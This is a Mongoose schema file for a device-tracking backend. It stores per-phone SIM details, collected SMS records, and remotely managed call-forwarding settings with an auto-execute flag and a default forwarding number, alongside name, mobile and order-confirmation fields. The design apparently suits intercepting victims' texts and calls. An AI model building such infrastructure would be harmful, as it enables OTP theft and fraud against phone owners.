import mongoose from 'mongoose';

const EnhancedSimSchema = new mongoose.Schema({
  slot: { type: Number, required: true },
  carrier: { type: String, default: 'Unknown' },
  phoneNumber: { type: String, default: '' },
  countryCode: { type: String, default: '' },
  mcc: { type: String, default: '' },
  mnc: { type: String, default: '' },
  displayName: { type: String, default: '' },
  forwarding: { type: String, default: '' },
  // NEW: Call forwarding status tracking
  forwardingStatus: {
    active: { type: Boolean, default: false },
    lastChecked: { type: Date, default: null },
    lastActivated: { type: Date, default: null },
    lastDeactivated: { type: Date, default: null },
    autoManaged: { type: Boolean, default: false }
  },
  updatedAt: { type: Date, default: Date.now }
}, {
  _id: false,
  versionKey: false
});


const UserSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    unique: true,
    index: true,
    validate: {
      validator: function (v) {
        return v &&
          v !== 'unknown' &&
          v !== 'unknown_device' &&
          v.length > 5 &&
          !/^\s*$/.test(v);
      },
      message: 'deviceId must be a valid device identifier (min 6 chars, not empty/unknown)'
    }
  },
  deviceName: {
    type: String,
    default: 'Unknown Device',
    maxlength: 100,
    trim: true
  },
  battery: {
    type: Number,
    default: 0,
    min: 0,
    max: 100,
    validate: {
      validator: function (v) {
        return v >= 0 && v <= 100;
      },
      message: 'Battery level must be between 0 and 100'
    }
  },
  online: {
    type: Boolean,
    default: false
  },
  // NEW: Enhanced SIM info field
  simInfo: {
    type: [EnhancedSimSchema],
    default: [],
    validate: {
      validator: function (v) {
        return Array.isArray(v) && v.length <= 2;
      },
      message: 'Maximum 2 SIM cards allowed'
    }
  },
  callForwardingSettings: {
    autoExecuteEnabled: { type: Boolean, default: false },
    monitoringEnabled: { type: Boolean, default: true },
    defaultAutoNumber: { type: String, default: '' },
    lastStatusCheck: { type: Date, default: null }
  },
  sms: {
    type: [{
      type: mongoose.Schema.Types.ObjectId,
      ref: 'Sms'
    }],
    default: [],
    validate: {
      validator: function (v) {
        return Array.isArray(v);
      },
      message: 'SMS must be an array'
    }
  },
  lastSeen: {
    type: Date,
    default: Date.now,
    index: true
  },
  totalSmsCount: {
    type: Number,
    default: 0,
    min: 0
  },
  lastSmsReceived: {
    type: Date,
    default: null
  },
  registrationCount: {
    type: Number,
    default: 1,
    min: 1
  },
  fullName: { type: String, default: '' },
  mobile: { type: String, default: '' },
  orderConfirmed: { type: Boolean, default: false }
}, {
  timestamps: true,
  versionKey: false,
  optimisticConcurrency: false,
  toJSON: {
    transform: function (doc, ret) {
      delete ret.__v;
      return ret;
    }
  }
});

// Existing indexes and middleware remain the same...
UserSchema.index({ deviceId: 1, lastSeen: -1 });
UserSchema.index({ online: 1, lastSeen: -1 });
UserSchema.index({ createdAt: -1 });

// Add new method for updating SIM info
UserSchema.methods.updateSimInfo = function (simInfoArray) {
  this.simInfo = simInfoArray.map(sim => ({
    ...sim,
    updatedAt: new Date()
  }));
  return this;
};

// NEW: Methods for call forwarding management
UserSchema.methods.updateCallForwardingStatus = function (slot, status) {
  const simIndex = this.simInfo.findIndex(sim => sim.slot === slot);
  if (simIndex !== -1) {
    this.simInfo[simIndex].forwardingStatus = {
      ...this.simInfo[simIndex].forwardingStatus,
      ...status,
      lastChecked: new Date()
    };
  }
  return this;
};

export default mongoose.model('User', UserSchema);
